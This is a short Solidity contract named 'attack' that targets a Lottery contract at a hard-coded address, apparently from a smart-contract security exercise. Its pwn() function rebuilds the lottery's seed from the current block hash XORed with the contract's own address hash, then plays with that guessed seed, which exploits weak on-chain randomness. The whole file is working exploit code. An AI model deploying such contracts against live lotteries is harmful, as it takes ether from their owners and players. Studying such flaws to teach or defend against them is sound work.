pragma solidity 0.4.24;
import './Lottery.sol';

contract attack {
    Lottery target;
    constructor() public{
        target=Lottery(0x57a9aab42e84b843e9d9bff383cef4c3f65f3d23);
    }
    function pwn() payable{
        bytes32 entropy = block.blockhash(block.number);
        bytes32 entropy2 = keccak256(this);
        uint256 seeds = uint256(entropy^entropy2);

        target.play.value(msg.value)(seeds);
    }
    function () payable{

    }
}